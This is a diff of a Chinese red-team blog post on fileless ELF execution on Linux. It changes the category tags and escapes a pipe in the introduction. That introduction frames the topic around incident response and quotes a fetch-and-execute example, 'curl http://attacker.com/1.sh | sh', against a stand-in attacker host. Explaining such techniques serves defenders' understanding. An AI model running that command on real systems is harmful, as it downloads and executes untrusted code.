@@ -2,14 +2,14 @@
 layout: post
 title: Linux无文件渗透执行ELF
 date: 2018-05-15 13:43:02
-categories: [Pentest, Red Team]
+categories: [Pentest, Red Team, fileless]
 ---
 
 > 本文首发[逢魔安全实验室微信公众号](https://mp.weixin.qq.com/s/SdR6ce9xjbS5UQbh14kfgg)
 
 ### 0x01 简介
 
-在进行Linux系统的攻击应急时，大家可能会查看pid以及/proc相关信息，比如通过*/proc/$pid/cmdline*查看某个可疑进程的启动命令，通过*/proc/$pid/exe*抓样本等，但是攻击者是否会通过某种类似于*curl http://attacker.com/1.sh | sh*的方法来执行elf二进制文件呢？最近看了一篇@MagisterQuis写的文章https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html，思路比较奇特，这里分享给大家，当然本文大部分内容都来自于这篇文章，大家也可以直接去读原文。
+在进行Linux系统的攻击应急时，大家可能会查看pid以及/proc相关信息，比如通过*/proc/$pid/cmdline*查看某个可疑进程的启动命令，通过*/proc/$pid/exe*抓样本等，但是攻击者是否会通过某种类似于*curl http://attacker.com/1.sh \| sh*的方法来执行elf二进制文件呢？最近看了一篇@MagisterQuis写的文章https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html，思路比较奇特，这里分享给大家，当然本文大部分内容都来自于这篇文章，大家也可以直接去读原文。
 
 ![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/pvl7sjjxrg.jpg)
 
